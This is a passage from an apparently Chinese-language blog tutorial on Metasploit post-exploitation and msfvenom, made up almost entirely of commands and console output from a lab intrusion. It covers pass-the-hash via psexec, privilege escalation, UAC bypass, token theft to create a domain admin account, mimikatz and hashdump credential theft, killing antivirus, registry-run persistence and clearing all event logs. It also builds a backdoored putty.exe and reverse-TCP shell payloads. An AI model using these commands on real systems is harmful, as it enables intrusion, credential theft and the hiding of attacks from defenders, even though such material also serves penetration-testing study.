exploit(windows/smb/psexec) &gt; set SMBPass aad3b435b51404eeaad3b435b51404ee:db3dd3018cff8541ab7168f899737020</span><br><span class="line">SMBPass =&gt; aad3b435b51404eeaad3b435b51404ee:db3dd3018cff8541ab7168f899737020</span><br><span class="line">msf exploit(windows/smb/psexec) &gt; set SMBUser Administrator</span><br><span class="line">SMBUser =&gt; Administrator</span><br><span class="line">msf exploit(windows/smb/psexec) &gt; exploit</span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.230:1444 </span><br><span class="line">[*] 192.168.1.187:445 - Connecting to the server...</span><br><span class="line">[*] 192.168.1.187:445 - Authenticating to 192.168.1.187:445 as user &apos;Administrator&apos;...</span><br><span class="line">[*] 192.168.1.187:445 - Selecting PowerShell target</span><br><span class="line">[*] 192.168.1.187:445 - Executing the payload...</span><br><span class="line">[+] 192.168.1.187:445 - Service start timed out, OK if running a command or non-service executable...</span><br><span class="line">[*] Sending stage (205891 bytes) to 192.168.1.187</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.1.230:1444 -&gt; 192.168.1.187:49468) at 2018-04-30 18:48:56 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure></p>
+<p>4.权限提升<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; use priv</span><br><span class="line">[-] The &apos;priv&apos; extension has already been loaded.</span><br><span class="line">meterpreter &gt; getsystem</span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure></p>
+<p>bypassuac </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line">msf exploit(windows/smb/psexec) &gt; use exploit/windows/local/bypassuac</span><br><span class="line">msf exploit(windows/local/bypassuac) &gt; set session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf exploit(windows/local/bypassuac) &gt; exploit</span><br></pre></td></tr></table></figure>
+<p>5.令牌的假冒<br>1）incognito<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; use incognito </span><br><span class="line">Loading extension incognito...Success.</span><br><span class="line">meterpreter &gt; list_tokens -u </span><br><span class="line"></span><br><span class="line">Delegation Tokens Available</span><br><span class="line">========================================</span><br><span class="line">NT AUTHORITY\LOCAL SERVICE</span><br><span class="line">NT AUTHORITY\NETWORK SERVICE</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line">WIN-VONVJ6OMEQ7\Administrator</span><br><span class="line"></span><br><span class="line">Impersonation Tokens Available</span><br><span class="line">========================================</span><br><span class="line">NT AUTHORITY\ANONYMOUS LOGON</span><br></pre></td></tr></table></figure></p>
+<p>2)ps 找到域管理员的pid参数(有时候不能看到）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter&gt;ps </span><br><span class="line">meterpreter &gt; steal_token pid号 #盗取域管理员用户的令牌</span><br></pre></td></tr></table></figure></p>
+<p>利用域管理员的令牌创建用户，并授予域管理员的权限<br>例子<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter&gt;impresonate_token SNEAKS.IN\\domianadmin</span><br><span class="line">meterpreter&gt;add_user qy qy -h 192.168.1.5 #-h是域管理员添加账号的地址</span><br><span class="line">meterpreter&gt;add_group_user &quot;Doamin Admins&quot; qy -h 192.168.1.5</span><br></pre></td></tr></table></figure></p>
+<p>6.通过跳板攻击其他主机<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets #查看本地子网</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">Local subnet: 192.168.1.0/255.255.255.0</span><br><span class="line"></span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line"></span><br><span class="line">msf exploit(windows/local/bypassuac) &gt; route add 192.168.2.0 255.255.255.0 1 #告诉系统将远程ID通过攻击会话1来进行路由</span><br><span class="line">[*] Route added</span><br><span class="line">msf exploit(windows/local/bypassuac) &gt; route print #显示当前活跃的路由信息</span><br><span class="line"></span><br><span class="line">IPv4 Active Routing Table</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   192.168.2.0        255.255.255.0      Session 1</span><br></pre></td></tr></table></figure></p>
+<p>7.获取系统管理员的密码<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">Loading extension mimikatz...Success.</span><br><span class="line">meterpreter &gt; wdigest</span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Retrieving wdigest credentials</span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">AuthID   Package    Domain        User              Password</span><br><span class="line">------   -------    ------        ----              --------</span><br><span class="line">0;996    Negotiate  WORKGROUP     WIN-VONVJ6OMEQ7$  </span><br><span class="line">0;46406  NTLM                                       </span><br><span class="line">0;997    Negotiate  NT AUTHORITY  LOCAL SERVICE     </span><br><span class="line">0;999    NTLM       WORKGROUP     WIN-VONVJ6OMEQ7$</span><br></pre></td></tr></table></figure></p>
+<p>8.脚本的使用<br>1).vnc<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run vnc #在远程系统上安装vnc会话</span><br><span class="line">[*] Creating a VNC reverse tcp stager: LHOST=192.168.1.230 LPORT=4545</span><br><span class="line">[*] Running payload handler</span><br><span class="line">[*] VNC stager executable 73802 bytes long</span><br><span class="line">[*] Uploaded the VNC agent to C:\Windows\TEMP\jzoEGmzImp.exe (must be deleted manually)</span><br><span class="line">[*] Executing the VNC agent with endpoint 192.168.1.230:4545...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; run screen_unlock # 对目标机器上的桌面进行解锁</span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/escalate/screen_unlock.</span><br><span class="line">[!] Example: run post/windows/escalate/screen_unlock OPTION=value [...]</span><br><span class="line">[*] no working target found</span><br></pre></td></tr></table></figure></p>
+<p>2).查看系统安装的软件<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_applications</span><br><span class="line"></span><br><span class="line">[*] Enumerating applications installed on WIN-VONVJ6OMEQ7</span><br><span class="line"></span><br><span class="line">Installed Applications</span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line"> Name                                                            Version</span><br><span class="line"> ----                                                            -------</span><br><span class="line"> 2345好压                                                          v5.9</span><br><span class="line"> Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.6161  9.0.30729.6161</span><br><span class="line"> Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161  9.0.30729.6161</span><br><span class="line"> Microsoft Visual C++ 2015 Redistributable (x64) - 14.0.24215    14.0.24215.1</span><br><span class="line"> Microsoft Visual C++ 2015 x64 Additional Runtime - 14.0.24215   14.0.24215</span><br><span class="line"> Microsoft Visual C++ 2015 x64 Minimum Runtime - 14.0.24215      14.0.24215</span><br><span class="line"> Python 2.7.13 (64-bit)                                          2.7.13150</span><br><span class="line"> VMware Tools                                                    10.2.0.7259539</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Results stored in: /root/.msf4/loot/20180501054603_default_192.168.1.187_host.application_930049.txt</span><br></pre></td></tr></table></figure></p>
+<p>3)迁移到稳定的进程<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; getpid</span><br><span class="line">Current pid: 1128</span><br><span class="line"></span><br><span class="line">meterpreter &gt; run post/windows/manage/migrate</span><br><span class="line">[*] Running module against WIN-VONVJ6OMEQ7</span><br><span class="line">[*] Current server process: spoolsv.exe (1128)</span><br><span class="line">[*] Spawning notepad.exe process to migrate to</span><br><span class="line">[+] Migrating to 3592</span><br><span class="line">[+] Successfully migrated to process 3592</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getpid</span><br><span class="line">Current pid: 3592</span><br></pre></td></tr></table></figure></p>
+<p>4)关闭杀毒软件<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run killav</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/killav.</span><br><span class="line">[!] Example: run post/windows/manage/killav OPTION=value [...]</span><br><span class="line">[*] Killing Antivirus services on the target...</span><br></pre></td></tr></table></figure></p>
+<p>5)查看目标机上的所有来流量<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run packetrecorder -i 1</span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/rpcapd_start.</span><br><span class="line">[!] Example: run post/windows/manage/rpcapd_start OPTION=value [...]</span><br><span class="line">[*] Starting Packet capture on interface 1</span><br><span class="line">[+] Packet capture started</span><br><span class="line">[*] Packets being saved in to /root/.msf4/logs/scripts/packetrecorder/WIN-VONVJ6OMEQ7_20180501.0138/WIN-VONVJ6OMEQ7_20180501.0138.cap</span><br><span class="line">[*] Packet capture interval is 30 Seconds</span><br></pre></td></tr></table></figure></p>
+<p>5)得到目标主机系统用户的哈希值<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run hashdump</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.</span><br><span class="line">[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]</span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY 24a05299b237d9f48c9eff1c6a88a57e...</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line"></span><br><span class="line">No users with password hints on this system</span><br><span class="line"></span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:db3dd3018cff8541ab7168f899737020:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure></p>
+<p>6)得到详细的系统信息<br>用户名和密码、下载全部注册表、挖掘密码哈希值和收集系统信息<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run scraper</span><br><span class="line">[*] New session on 192.168.1.187:445...</span><br><span class="line">[*] Gathering basic system information...</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Obtaining the entire registry...</span><br><span class="line">[*]  Exporting HKCU</span><br><span class="line">[*]  Downloading HKCU (C:\Windows\TEMP\JKaHEoEs.reg)</span><br><span class="line">[*]  Cleaning HKCU</span><br><span class="line">[*]  Exporting HKLM</span><br><span class="line">[*]  Downloading HKLM (C:\Windows\TEMP\qCMsnidu.reg)</span><br><span class="line">[*]  Cleaning HKLM</span><br><span class="line">[*]  Exporting HKCC</span><br><span class="line">[*]  Downloading HKCC (C:\Windows\TEMP\PTbboPFX.reg)</span><br><span class="line">[*]  Cleaning HKCC</span><br><span class="line">[*]  Exporting HKCR</span><br><span class="line">[*]  Downloading HKCR (C:\Windows\TEMP\AQMWnvZo.reg)</span><br><span class="line">[*]  Cleaning HKCR</span><br><span class="line">[*]  Exporting HKU</span><br><span class="line">[*]  Downloading HKU (C:\Windows\TEMP\XNLnHUgE.reg)</span><br><span class="line">[*]  Cleaning HKU</span><br><span class="line">[*] Completed processing on 192.168.1.187:445...</span><br></pre></td></tr></table></figure></p>
+<p>7）控制持久化<br>-X 开机自启动，-i 40每40秒重连一次 -p指定端口<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run persistence -X -i 40 -p 443 -r 192.168.1.187 </span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file for cleanup created at /root/.msf4/logs/persistence/WIN-VONVJ6OMEQ7_20180501.2631/WIN-VONVJ6OMEQ7_20180501.2631.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.1.187 LPORT=443</span><br><span class="line">[*] Persistent agent script is 99671 bytes long</span><br><span class="line">[+] Persistent Script written to C:\Windows\TEMP\ManzZNr.vbs</span><br><span class="line">[*] Executing script C:\Windows\TEMP\ManzZNr.vbs</span><br><span class="line">[+] Agent executed with PID 3852</span><br><span class="line">[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\KHNDPfTiTa</span><br><span class="line">[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\KHNDPfTiTa</span><br></pre></td></tr></table></figure></p>
+<p>开始连接<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use multi/handler</span><br><span class="line">msf exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; set lhost 192.168.1.187</span><br><span class="line">lhost =&gt; 192.168.1.187</span><br><span class="line">msf exploit(multi/handler) &gt; set lport 443</span><br><span class="line">lport =&gt; 443</span><br><span class="line">msf exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure></p>
+<p>8）列出所有后渗透模块<br><code>run post/</code> 后，按tab见<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run post/</span><br><span class="line">Display all 207 possibilities? (y or n)</span><br></pre></td></tr></table></figure></p>
+<p>9.Railgun组件操作windows API<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; irb</span><br><span class="line">[*] Starting IRB shell</span><br><span class="line">[*] The &quot;client&quot; variable holds the meterpreter client</span><br><span class="line">&gt;&gt; client.railgun.user32.MessageBoxA(0,&quot;hello&quot;,&quot;world&quot;,&quot;MB_OK&quot;)</span><br></pre></td></tr></table></figure></p>
+<p>结果如下图<br><img src="/posts/../../images/zhahun/1.png" alt=""><br>10.将shell提升为meterpreter<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\system32&gt; # ctrl+z 把会话放在后台 </span><br><span class="line">Background session 1? [y/N]  y</span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; sessions -i</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type               Information                                                                       Connection</span><br><span class="line">  --  ----  ----               -----------                                                                       ----------</span><br><span class="line">  1         shell x64/windows  Microsoft Windows [_ 6.1.7601] _ (c) 2009 Microsoft Corporation_ C:\Windows\s...  192.168.1.230:4411 -&gt; 192.168.1.187:54038 (192.168.1.187)</span><br><span class="line"></span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; sessions -u 1  #升级为meterpreter</span><br></pre></td></tr></table></figure></p>
+<p>11.隐藏踪迹<br>清除了所有日志，容易被发现。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run event_manager</span><br><span class="line">Meterpreter Script for Windows Event Log Query and Clear.</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -c &lt;opt&gt;  Clear a given Event Log (or ALL if no argument specified)</span><br><span class="line">    -f &lt;opt&gt;  Event ID to filter events on</span><br><span class="line">    -h        Help menu</span><br><span class="line">    -i        Show information about Event Logs on the System and their configuration</span><br><span class="line">    -l &lt;opt&gt;  List a given Event Log.</span><br><span class="line">    -p        Supress printing filtered logs to screen</span><br><span class="line">    -s &lt;opt&gt;  Save logs to local CSV file, optionally specify alternate folder in which to save logs</span><br><span class="line"></span><br><span class="line">meterpreter &gt; run event_manager -c</span><br><span class="line">[-] You must specify and eventlog to query!</span><br><span class="line">[*] Application: </span><br><span class="line">[*] Clearing Application</span><br><span class="line">[*] Event Log Application Cleared!</span><br><span class="line">[*] HardwareEvents: </span><br><span class="line">[*] Clearing HardwareEvents</span><br><span class="line">[*] Event Log HardwareEvents Cleared!</span><br><span class="line">[*] Internet Explorer: </span><br><span class="line">[*] Clearing Internet Explorer</span><br><span class="line">[*] Event Log Internet Explorer Cleared!</span><br><span class="line">[*] Key Management Service: </span><br><span class="line">[*] Clearing Key Management Service</span><br><span class="line">[*] Event Log Key Management Service Cleared!</span><br><span class="line">[*] Security: </span><br><span class="line">[*] Clearing Security</span><br><span class="line">[*] Event Log Security Cleared!</span><br><span class="line">[*] System: </span><br><span class="line">[*] Clearing System</span><br><span class="line">[*] Event Log System Cleared!</span><br><span class="line">[*] ThinPrint Diagnostics: </span><br><span class="line">[*] Clearing ThinPrint Diagnostics</span><br><span class="line">[*] Event Log ThinPrint Diagnostics Cleared!</span><br><span class="line">[*] Windows PowerShell: </span><br><span class="line">[*] Clearing Windows PowerShell</span><br><span class="line">[*] Event Log Windows PowerShell Cleared!</span><br></pre></td></tr></table></figure></p>
+<h1 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h1><p>msfpayload（荷载生成器），msfencoder（编码器），msfcli（监听接口）已然成为历史，取而代之的是msfvenom<br>1.常识<br>参数含义：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# msfvenom -h</span><br><span class="line">MsfVenom - a Metasploit standalone payload generator.</span><br><span class="line">Also a replacement for msfpayload and msfencode.</span><br><span class="line">Usage: /usr/bin/msfvenom [options] &lt;var=val&gt;</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">    -p, --payload       &lt;payload&gt;    Payload to use. Specify a &apos;-&apos; or stdin to use custom payloads</span><br><span class="line">        --payload-options            List the payload&apos;s standard options</span><br><span class="line">    -l, --list          [type]       List a module type. Options are: payloads, encoders, nops, all</span><br><span class="line">    -n, --nopsled       &lt;length&gt;     Prepend a nopsled of [length] size on to the payload</span><br><span class="line">    -f, --format        &lt;format&gt;     Output format (use --help-formats for a list)</span><br><span class="line">        --help-formats               List available formats</span><br><span class="line">    -e, --encoder       &lt;encoder&gt;    The encoder to use</span><br><span class="line">    -a, --arch          &lt;arch&gt;       The architecture to use</span><br><span class="line">        --platform      &lt;platform&gt;   The platform of the payload</span><br><span class="line">        --help-platforms             List available platforms</span><br><span class="line">    -s, --space         &lt;length&gt;     The maximum size of the resulting payload</span><br><span class="line">        --encoder-space &lt;length&gt;     The maximum size of the encoded payload (defaults to the -s value)</span><br><span class="line">    -b, --bad-chars     &lt;list&gt;       The list of characters to avoid example: &apos;\x00\xff&apos;</span><br><span class="line">    -i, --iterations    &lt;count&gt;      The number of times to encode the payload</span><br><span class="line">    -c, --add-code      &lt;path&gt;       Specify an additional win32 shellcode file to include</span><br><span class="line">    -x, --template      &lt;path&gt;       Specify a custom executable file to use as a template</span><br><span class="line">    -k, --keep                       Preserve the template behavior and inject the payload as a new thread</span><br><span class="line">    -o, --out           &lt;path&gt;       Save the payload</span><br><span class="line">    -v, --var-name      &lt;name&gt;       Specify a custom variable name to use for certain output formats</span><br><span class="line">        --smallest                   Generate the smallest possible payload</span><br><span class="line">    -h, --help                       Show this message</span><br></pre></td></tr></table></figure></p>
+<p>1)查看payload<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~#  msfvenom -l payloads</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Framework Payloads (507 total)</span><br><span class="line">==============================</span><br><span class="line"></span><br><span class="line">    Name                                                Description</span><br><span class="line">    ----                                                -----------</span><br><span class="line">    aix/ppc/shell_bind_tcp                              Listen for a connection and spawn a command shell</span><br><span class="line">    aix/ppc/shell_find_port                             Spawn a shell on an established connection</span><br><span class="line">    aix/ppc/shell_interact                              Simply execve /bin/sh (for inetd programs)</span><br><span class="line">    aix/ppc/shell_reverse_tcp                           Connect back to attacker and spawn a command shell</span><br><span class="line">    android/meterpreter/reverse_http                    Run a meterpreter server in Android. Tunnel communication over HTTP</span><br><span class="line">    android/meterpreter/reverse_https                   Run a meterpreter server in Android. Tunnel communication over HTTPS</span><br><span class="line">    android/meterpreter/reverse_tcp                     Run a meterpreter server in Android. Connect back stager</span><br><span class="line"> ……</span><br></pre></td></tr></table></figure></p>
+<p>2)查看编码方法<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~#  msfvenom -l encoders</span><br><span class="line"></span><br><span class="line">Framework Encoders</span><br><span class="line">==================</span><br><span class="line"></span><br><span class="line">    Name                          Rank       Description</span><br><span class="line">    ----                          ----       -----------</span><br><span class="line">    cmd/echo                      good       Echo Command Encoder</span><br><span class="line">    cmd/generic_sh                manual     Generic Shell Variable Substitution Command Encoder</span><br><span class="line">    cmd/ifs                       low        Generic $&#123;IFS&#125; Substitution Command Encoder</span><br><span class="line">    cmd/perl                      normal     Perl Command Encoder</span><br><span class="line">    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder</span><br><span class="line">    cmd/printf_php_mq             manual     printf(1) via PHP magic_quotes Utility Command Encoder</span><br><span class="line">    generic/eicar                 manual     The EICAR Encoder</span><br><span class="line">    generic/none                  normal     The &quot;none&quot; Encoder</span><br><span class="line">    mipsbe/byte_xori              normal     Byte XORi Encoder</span><br><span class="line">    mipsbe/longxor                normal     XOR Encoder</span><br><span class="line">    mipsle/byte_xori              normal     Byte XORi Encoder</span><br><span class="line">    mipsle/longxor                normal     XOR Encoder</span><br><span class="line">    php/base64                    great      PHP Base64 Encoder</span><br><span class="line">    ppc/longxor                   normal     PPC LongXOR Encoder</span><br><span class="line">    ppc/longxor_tag               normal     PPC LongXOR Encoder</span><br><span class="line">    sparc/longxor_tag             normal     SPARC DWORD XOR Encoder</span><br><span class="line">    x64/xor                       normal     XOR Encoder</span><br><span class="line">    x64/zutto_dekiru              manual     Zutto Dekiru</span><br><span class="line">    x86/add_sub                   manual     Add/Sub Encoder</span><br><span class="line">    x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder</span><br><span class="line">    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder</span><br><span class="line">    x86/avoid_underscore_tolower  manual     Avoid underscore/tolower</span><br><span class="line">    x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower</span><br><span class="line">    x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder</span><br><span class="line">    x86/bmp_polyglot              manual     BMP Polyglot</span><br><span class="line">    x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder</span><br><span class="line">    x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder</span><br><span class="line">    x86/context_stat              manual     stat(2)-based Context Keyed Payload Encoder</span><br><span class="line">    x86/context_time              manual     time(2)-based Context Keyed Payload Encoder</span><br><span class="line">    x86/countdown                 normal     Single-byte XOR Countdown Encoder</span><br><span class="line">    x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder</span><br><span class="line">    x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder</span><br><span class="line">    x86/nonalpha                  low        Non-Alpha Encoder</span><br><span class="line">    x86/nonupper                  low        Non-Upper Encoder</span><br><span class="line">    x86/opt_sub                   manual     Sub Encoder (optimised)</span><br><span class="line">    x86/service                   manual     Register Service</span><br><span class="line">    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder</span><br><span class="line">    x86/single_static_bit         manual     Single Static Bit</span><br><span class="line">    x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder</span><br><span class="line">    x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder</span><br></pre></td></tr></table></figure></p>
+<p>exclent级别<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd/powershell_base64  </span><br><span class="line">x86/shikata_ga_nai</span><br></pre></td></tr></table></figure></p>
+<p>3)查看nops选项（空字段模块，为了绕过和免杀）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">root@kali:~# msfvenom -l nops</span><br><span class="line"></span><br><span class="line">Framework NOPs (10 total)</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line">    Name             Description</span><br><span class="line">    ----             -----------</span><br><span class="line">    aarch64/simple   Simple NOP generator</span><br><span class="line">    armle/simple     Simple NOP generator</span><br><span class="line">    mipsbe/better    Better NOP generator</span><br><span class="line">    php/generic      Generates harmless padding for PHP scripts</span><br><span class="line">    ppc/simple       Simple NOP generator</span><br><span class="line">    sparc/random     SPARC NOP generator</span><br><span class="line">    tty/generic      Generates harmless padding for TTY input</span><br><span class="line">    x64/simple       An x64 single/multi byte NOP instruction generator.</span><br><span class="line">    x86/opty2        Opty2 multi-byte NOP generator</span><br><span class="line">    x86/single_byte  Single-byte NOP generator</span><br></pre></td></tr></table></figure></p>
+<p>4)可支持的平台<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">root@kali:~# msfvenom --help-platforms</span><br><span class="line">Platforms</span><br><span class="line">	aix, android, apple_ios, bsd, bsdi, cisco, firefox, freebsd, hardware, hpux, irix, java, javascript, linux, mainframe, multi, netbsd, netware, nodejs, openbsd, osx, php, python, r, ruby, solaris, unix, windows</span><br></pre></td></tr></table></figure></p>
+<p>5)可生成的格式<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# msfvenom --help-formats</span><br><span class="line">Executable formats</span><br><span class="line">	asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, jar, jsp, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-cmd, psh-net, psh-reflection, vba, vba-exe, vba-psh, vbs, war</span><br><span class="line">Transform formats</span><br><span class="line">	bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript</span><br></pre></td></tr></table></figure></p>
+<p>6)查payload选项<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    ----  ---------------  --------  -----------</span><br><span class="line">root@kali:~# msfvenom -p windows/x64/meterpreter/reverse_tcp --payload-options</span><br><span class="line">Options for payload/windows/x64/meterpreter/reverse_tcp:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       Name: Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager</span><br><span class="line">     Module: payload/windows/x64/meterpreter/reverse_tcp</span><br><span class="line">   Platform: Windows</span><br><span class="line">       Arch: x64 #是指生成的payload只能在64位系统运行 </span><br><span class="line">Needs Admin: No</span><br><span class="line"> Total size: 449</span><br><span class="line">       Rank: Normal</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">    skape &lt;mmiller@hick.org&gt;</span><br><span class="line">    sf &lt;stephen_fewer@harmonysecurity.com&gt;</span><br><span class="line">    OJ Reeves</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">Name      Current Setting  Required  Description</span><br><span class="line">----      ---------------  --------  -----------</span><br><span class="line">EXITFUNC  process          yes       Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)</span><br><span class="line">LHOST                      yes       The listen address</span><br><span class="line">LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  Inject the meterpreter server DLL via the Reflective Dll Injection </span><br><span class="line">  payload (staged x64). Connect back to the attacker (Windows x64)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Advanced options for payload/windows/x64/meterpreter/reverse_tcp:</span><br><span class="line"></span><br><span class="line">    Name                         Current Setting  Required  Description</span><br><span class="line">    ----                         ---------------  --------  -----------</span><br><span class="line">    AutoLoadStdapi               true             yes       Automatically load the Stdapi extension</span><br><span class="line">    AutoRunScript                                 no        A script to run automatically on session creation.</span><br></pre></td></tr></table></figure></p>
+<p>2.生成payload<br>1)将payload注入到putty中(会被360杀掉）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# msfvenom -p windows/xmeterpreter/reverse_tcp LHOST=192.168.1.230 LPORT=4443 -a x86 --platform windows -e x86/shikata_ga_nai -i 3 -x /root/putty.exe -k -f exe -o /root/Desktop/putty_evil.exe</span><br><span class="line">Skipping invalid encoder x64/shikata_ga_nai</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 510 bytes</span><br><span class="line">Final size of exe file: 867840 bytes</span><br><span class="line">Saved as: /root/Desktop/putty_evil.exe</span><br></pre></td></tr></table></figure></p>
+<p>2)windows x64(被杀）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.230 LPORT=4441 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure></p>
+<p>3)linux<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.230  LPORT=4441 -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure></p>
+
+                
+<p class="pink-link-context">
+    <a href="/posts/9cda70be.html" rel="next" title="namp工具的细究">
+    Prev: namp工具的细究
+  </a>
+</p>
+
+
+
+<p class="pink-link-context">
+    <a href="/posts/11dc13a6.html" rel="next" title="三秒钟的记忆">
+    Next: 三秒钟的记忆
+  </a>
+</p>
+
+
+            </div>
+			
+        </div>
+    </div>
+</article>
+
+
